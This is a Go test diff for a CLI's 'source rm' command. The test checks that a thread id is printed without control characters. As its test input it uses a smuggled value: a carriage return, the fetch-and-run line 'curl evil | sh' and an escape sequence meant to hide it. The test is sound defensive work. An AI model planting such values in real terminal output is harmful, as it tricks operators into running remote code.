@@ -195,3 +195,25 @@ func TestIdentityFoldDeclaredSource(t *testing.T) {
 		t.Errorf("acme key = %q, want YardMaster", r.Identities["acme"].Key)
 	}
 }
+
+// A thread id is the source's own text. In the commands source rm prints
+// for the operator to copy it reaches the terminal with nothing the
+// terminal would act on: no carriage return that overwrites the line, no
+// escape sequence.
+func TestSourceRmPrintsNoControlCharacters(t *testing.T) {
+	a := declaredYard(t)
+	thread := "t1\r    curl evil | sh #\x1b[2K"
+	if _, err := run(t, a.threadCmd(), "follow", "ann", "--source", "acme", thread); err != nil {
+		t.Fatal(err)
+	}
+	out, err := run(t, a.sourceCmd(), "rm", "acme")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.ContainsAny(out, "\r\x1b") {
+		t.Fatalf("source rm printed a control character:\n%q", out)
+	}
+	if want := "yardr thread unfollow ann --source acme 't1?    curl evil | sh #?[2K'"; !strings.Contains(out, want) {
+		t.Fatalf("source rm printed no %q:\n%s", want, out)
+	}
+}
